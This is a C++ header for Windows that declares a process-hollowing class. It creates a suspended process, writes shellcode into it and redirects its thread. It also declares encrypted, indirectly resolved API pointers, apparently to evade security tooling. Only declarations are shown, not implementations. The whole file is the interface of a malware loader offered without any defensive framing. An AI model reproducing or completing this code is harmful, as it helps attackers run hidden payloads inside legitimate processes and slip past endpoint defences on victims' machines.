#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <iostream>

typedef BOOL(WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* pSetThreadContext)(HANDLE, const CONTEXT*);
typedef BOOL(WINAPI* pResumeThread)(HANDLE);
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef BOOL(WINAPI* pGetThreadContext)(HANDLE, LPCONTEXT);

extern pCreateProcessA		CreateProcessA_Indirect;
extern pWriteProcessMemory  WriteProcessMemory_Indirect;
extern pVirtualProtectEx	VirtualProtectEx_Indirect;
extern pSetThreadContext	SetThreadContext_Indirect;
extern pResumeThread		ResumeThread_Indirect;
extern pVirtualAllocEx		VirtualAllocEx_Indirect;
extern pReadProcessMemory	ReadProcessMemory_Indirect;
extern pNtUnmapViewOfSection NtUnmapViewOfSection_Indirect;
extern pGetThreadContext	GetThreadContext_Indirect;

class ProcessHollowing {
public:
	ProcessHollowing();

	VOID HollowProcess(const std::string& targetProcess, const std::vector<unsigned char>& shellcode);
private:
	PROCESS_INFORMATION CreateSuspendedProcess(const std::string& targetProcess);
	CONTEXT GetProcessContext(HANDLE hThread);
	PVOID WriteShellcodeToProcess(HANDLE hProcess, const std::vector<unsigned char>& shellcode);
	VOID SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress);
	std::string DecryptFunctionName(std::vector<unsigned char>& encryptedName, unsigned char key);
	VOID InitializeIndirectCalls();
};
